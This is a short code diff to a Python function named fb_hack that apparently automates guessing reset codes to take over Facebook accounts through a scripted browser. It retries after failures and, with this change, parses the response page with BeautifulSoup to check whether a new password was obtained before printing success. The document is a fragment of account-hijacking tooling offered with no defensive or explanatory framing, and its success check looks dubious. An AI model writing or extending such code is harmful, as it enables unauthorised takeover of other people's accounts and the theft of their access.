@@ -155,7 +155,12 @@ def fb_hack(email, codex):
         print(s.join(fail))
         sleep(30)
       else:
-        print(s.join(success))
+        soup = BeautifulSoup(response1, 'html.parser')
+        if soup.find(string="password_new") == test:
+          print("Password not found")
+          browser.close()
+        else:
+          print(s.join(success))
   elif check2 != test:
     print(check2)
     reset = int(codex)
@@ -177,7 +182,12 @@ def fb_hack(email, codex):
         print(s.join(fail))
         sleep(30)
       else:
-        print(s.join(success))
+        soup = BeautifulSoup(response1, 'html.parser')
+        if soup.find(string="password_new") == test:
+          print("Password not found")
+          browser.close()
+        else:
+          print(s.join(success))
   else:
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
